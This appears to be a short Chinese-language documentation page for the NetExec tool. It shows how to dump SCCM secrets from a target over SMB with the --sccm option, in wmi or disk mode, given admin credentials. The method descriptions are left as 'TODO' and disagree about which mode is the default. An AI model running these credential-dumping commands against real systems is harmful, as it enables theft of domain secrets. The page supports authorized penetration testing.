# 🆕 导出 SCCM

### 使用 dploot 中的方法从目标导出 SCCM

{% hint style="danger" %}
需要目标域控制器上的域管理员或本地管理员权限
{% endhint %}

```
有 2 种可用方法：   
(默认) wmi - TODO
       disk - TODO (默认)
```

```
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm disk
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm wmi
```
